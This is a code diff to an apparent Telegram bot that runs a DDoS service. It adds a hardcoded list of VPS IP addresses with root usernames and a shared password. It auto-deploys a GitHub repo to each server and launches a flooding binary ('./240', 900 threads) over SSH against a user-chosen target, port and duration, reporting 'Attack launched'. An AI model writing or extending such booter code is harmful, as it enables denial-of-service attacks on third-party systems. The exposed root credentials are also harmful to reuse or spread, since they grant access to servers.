@@ -29,7 +29,17 @@ def load_vps_list():
         with open(VPS_FILE, "r") as f:
             return json.load(f)
     except:
-        return []
+        return [
+            {"ip": "143.198.145.221", "user": "root", "pass": "@Sagar82025840s"},
+            {"ip": "143.198.110.93", "user": "root", "pass": "@Sagar82025840s"},
+            {"ip": "134.199.209.55", "user": "root", "pass": "@Sagar82025840s"},
+            {"ip": "147.182.243.220", "user": "root", "pass": "@Sagar82025840s"},
+            {"ip": "24.199.113.144", "user": "root", "pass": "@Sagar82025840s"},
+            {"ip": "147.182.253.82", "user": "root", "pass": "@Sagar82025840s"},
+            {"ip": "161.35.235.217", "user": "root", "pass": "@Sagar82025840s"},
+            {"ip": "144.126.211.82", "user": "root", "pass": "@Sagar82025840s"},
+            {"ip": "143.198.53.142", "user": "root", "pass": "@Sagar82025840s"}
+        ]
 
 def save_vps_list():
     with open(VPS_FILE, "w") as f:
@@ -37,31 +47,53 @@ def save_vps_list():
 
 vps_list = load_vps_list()
 
-def deploy_single_vps(vps):
+def deploy_single_vps(vps, notify_chat_id=None):
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=30)
-        
+        ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=60)
+
         commands = [
-            # Ubuntu 24.04: update package list and install git non-interactively
+            # Step 1: Update Ubuntu 24.04 package list
             "export DEBIAN_FRONTEND=noninteractive && apt-get update -y",
-            "export DEBIAN_FRONTEND=noninteractive && apt-get install -y git",
-            # Clean old clone and fresh pull
+            # Step 2: Install all required dependencies
+            (
+                "export DEBIAN_FRONTEND=noninteractive && apt-get install -y "
+                "git screen curl wget build-essential "
+                "libssl-dev libpcap-dev libpthread-stubs0-dev "
+                "gcc g++ make"
+            ),
+            # Step 3: Clean old clone
             "rm -rf ~/Clodways",
+            # Step 4: Fresh git clone
             "git clone https://github.com/SagarExe/Clodways.git ~/Clodways",
-            "cd ~/Clodways && chmod +x *"
+            # Step 5: Make all files executable
+            "cd ~/Clodways && chmod +x *",
         ]
-        
+
         for cmd in commands:
-            stdin, stdout, stderr = ssh.exec_command(cmd)
+            stdin, stdout, stderr = ssh.exec_command(cmd, get_pty=True)
             stdout.channel.recv_exit_status()  # wait for each command to finish
             time.sleep(1)
-        
+
         ssh.close()
-        logging.info(f"✅ Fresh deploy done on {vps['ip']} (Ubuntu 24.04)")
+        logging.info(f"✅ Full deploy done on {vps['ip']} (Ubuntu 24.04)")
+        if notify_chat_id:
+            bot.send_message(
+                notify_chat_id,
+                f"✅ *Deploy complete on* `{vps['ip']}`\n"
+                f"📦 Dependencies installed\n"
+                f"📁 Clodways cloned & ready",
+                parse_mode='Markdown'
+            )
     except Exception as e:
         logging.error(f"Deploy error on {vps['ip']}: {e}")
+        if notify_chat_id:
+            bot.send_message(
+                notify_chat_id,
+                f"❌ *Deploy failed on* `{vps['ip']}`\n`{e}`",
+                parse_mode='Markdown'
+            )
 
 def deploy_to_all_vps():
     for vps in vps_list:
@@ -70,17 +102,36 @@ def deploy_to_all_vps():
 # Auto fresh deploy on every bot start
 deploy_to_all_vps()
 
+THREADS = 900
+
 def remote_execute(vps, target, port, duration):
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=10)
-        
-        command = f"cd \~/Clodways && nohup timeout {duration}s ./soul {target} {port} {duration} > /dev/null 2>&1 &"
-        
-        ssh.exec_command(command)
+        ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=15)
+
+        # Launch ./240 with 900 threads in background
+        command = (
+            f"cd $HOME/Clodways && "
+            f"nohup timeout {duration}s ./240 {target} {port} {duration} {THREADS} "
+            f"> /tmp/attack.log 2>&1 &"
+        )
+        ssh.exec_command(command, get_pty=True)
+        time.sleep(3)
+
+        # Verify process is running
+        _, check_out, _ = ssh.exec_command("pgrep -f './240' | wc -l")
+        count = check_out.read().decode().strip()
+
+        _, err_out, _ = ssh.exec_command("cat /tmp/attack.log 2>/dev/null | head -10")
+        err_msg = err_out.read().decode().strip()
+
+        if count == "0" or count == "":
+            logging.error(f"❌ 240 NOT running on {vps['ip']} | log: {err_msg}")
+        else:
+            logging.info(f"✅ Attack launched on {vps['ip']} — 240 processes: {count}")
+
         ssh.close()
-        logging.info(f"✅ Attack launched instantly on {vps['ip']}")
     except Exception as e:
         logging.error(f"SSH Error on {vps['ip']}: {e}")
 
@@ -381,8 +432,14 @@ def add_vps_command(message):
     new_vps = {"ip": ip, "user": user, "pass": password}
     vps_list.append(new_vps)
     save_vps_list()
-    bot.reply_to(message, f"✅ VPS {ip} added. Deploying now...")
-    threading.Thread(target=deploy_single_vps, args=(new_vps,)).start()
+    bot.reply_to(
+        message,
+        f"✅ VPS `{ip}` added!\n"
+        f"⏳ Installing dependencies & cloning repo in the background...\n"
+        f"You'll get a message when it's ready.",
+        parse_mode='Markdown'
+    )
+    threading.Thread(target=deploy_single_vps, args=(new_vps, message.chat.id)).start()
 
 @bot.message_handler(commands=['stop_all'])
 def stop_all_command(message):
